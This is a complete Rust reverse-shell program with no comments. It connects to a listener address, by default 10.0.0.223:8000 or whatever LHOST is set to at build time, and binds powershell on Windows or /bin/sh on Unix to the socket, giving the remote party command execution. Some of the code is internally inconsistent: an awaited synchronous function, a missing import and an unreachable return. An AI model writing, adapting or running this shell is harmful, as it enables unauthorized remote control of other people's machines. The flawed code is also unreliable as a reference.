#[cfg(unix)]
use std::process::Stdio;

use tokio::net::TcpStream;

#[cfg(windows)]
async fn establish_stream(mut stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
    use std::process::Stdio;
    use tokio::{
        io::{AsyncReadExt, AsyncWriteExt},
        process::Command,
    };

    let mut child = Command::new("powershell")
        .arg("-c")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();

    let mut stdin = child.stdin.take().unwrap();
    let mut stdout = child.stdout.take().unwrap();

    loop {
        let mut read_buf = vec![0; 4096];
        let mut write_buf = vec![0; 4096];

        let (read_len, write_len) = tokio::select! {
            read_len = stream.read(&mut read_buf) => {
                let read_len = read_len?;
                (read_len, 0)
            },
            write_len = stdout.read(&mut write_buf) => {
                let write_len = write_len?;
                (0, write_len)
            }
        };

        if read_len > 0 {
            stdin.write_all(&read_buf[..read_len]).await?;
        }

        if write_len > 0 {
            stream.write_all(&write_buf[..write_len]).await?;
        }
    }

    Ok(())
}

#[cfg(unix)]
fn establish_stream(stream: TcpStream) {
    use std::os::fd::{AsRawFd, FromRawFd};
    let fd = stream.as_raw_fd();

    Command::new("/bin/sh")
        .stdin(Stdio::from(unsafe { Stdio::from_raw_fd(fd) }))
        .stdout(Stdio::from(unsafe { Stdio::from_raw_fd(fd) }))
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let home = option_env!("LHOST").unwrap_or("10.0.0.223:8000");

    let s = TcpStream::connect(home).await.unwrap();

    establish_stream(s).await
}
